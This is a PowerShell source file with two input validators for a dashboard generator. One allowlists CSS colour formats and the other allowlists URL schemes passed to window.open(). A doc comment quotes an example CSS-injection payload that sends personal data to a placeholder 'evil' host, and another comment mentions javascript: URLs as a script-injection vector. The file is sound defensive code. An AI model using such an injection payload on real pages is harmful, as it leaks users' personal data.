function Test-DhSafeCssColor {
    <#
    .SYNOPSIS
        Validate a user-supplied CSS colour for safe use in inline style="…" markup.

    .DESCRIPTION
        Several public cmdlets accept a -Color (or per-item Color) string that the
        JS renderer interpolates into  style="background: <Color>"  via innerHTML.
        The HTML-escape used elsewhere (esc()) escapes < > & " but does NOT escape
        the CSS metacharacters  : ;  ( )  — so a malicious caller supplying e.g.

           red; background-image: url(http://evil/log?u=PII)

        would inject arbitrary CSS rules into the style attribute. This validator
        accepts only the four shapes that are useful for chart colours and rejects
        everything else with a deterministic, descriptive error.

        Accepted shapes:
          - #RGB / #RGBA / #RRGGBB / #RRGGBBAA   (3-, 4-, 6-, 8-digit hex)
          - rgb(...) / rgba(...) / hsl(...) / hsla(...)
                       — argument list restricted to digits, ., comma, %, space
          - var(--token)   — CSS custom-property reference (any --token name)
          - a single CSS named colour token (e.g. 'red', 'darkblue', 'transparent')

    .PARAMETER Color
        The colour string to validate. Empty / null are treated as "no colour
        supplied" and return $null (caller emits no inline-style attribute).

    .PARAMETER Context
        Free-form caller identifier used in the error message (e.g.
        "Add-DhPieChart slice 'Available'").
    #>
    param(
        [string] $Color,
        [string] $Context = 'colour value'
    )

    if ([string]::IsNullOrWhiteSpace($Color)) { return $null }

    $trimmed = $Color.Trim()

    $patterns = @(
        '^#[0-9a-fA-F]{3,4}$',                            # #RGB or #RGBA
        '^#[0-9a-fA-F]{6}$',                              # #RRGGBB
        '^#[0-9a-fA-F]{8}$',                              # #RRGGBBAA
        '^rgba?\(\s*[0-9.,\s%]+\s*\)$',                   # rgb()/rgba()
        '^hsla?\(\s*[0-9.,\s%]+\s*\)$',                   # hsl()/hsla()
        '^var\(\s*--[A-Za-z0-9_-]+\s*\)$',                # var(--token)
        '^[a-zA-Z]{3,32}$'                                # named colour
    )

    foreach ($p in $patterns) {
        if ($trimmed -match $p) { return $trimmed }
    }

    throw "$Context : '$Color' is not a recognised CSS colour. Pass a hex literal (#fff / #ffffff), rgb()/rgba(), hsl()/hsla(), var(--token), or a CSS named colour."
}


function Test-DhSafeActionUrl {
    <#
    .SYNOPSIS
        Validate a user-supplied URL before it flows into window.open() inside the
        generated dashboard.

    .DESCRIPTION
        Add-DhAlertBanner -Action @{Url=…} and Add-DhSummary tile Action.Url are
        both passed straight to  window.open(url, '_blank', 'noopener')  by the
        JS renderer. Without a scheme allowlist, a caller (or upstream tainted
        data piped into a caller) could supply  javascript:…  and execute script
        inside the dashboard's origin.

        Allowed schemes: http:, https:, mailto:, tel:, and a leading '#'
        (in-page anchor). Everything else throws.

    .PARAMETER Url
        The URL to validate. Null / empty returns the empty string (no Url
        supplied — the cmdlet caller handles the "Url-not-set" case).

    .PARAMETER Context
        Free-form caller identifier used in the error message.
    #>
    param(
        [string] $Url,
        [string] $Context = 'Action Url'
    )

    if ([string]::IsNullOrWhiteSpace($Url)) { return '' }

    if ($Url -match '^(https?:|mailto:|tel:|#)') { return $Url }

    throw "$Context : '$Url' uses a scheme that is not allowed. Action Url must start with http:, https:, mailto:, tel:, or '#'."
}
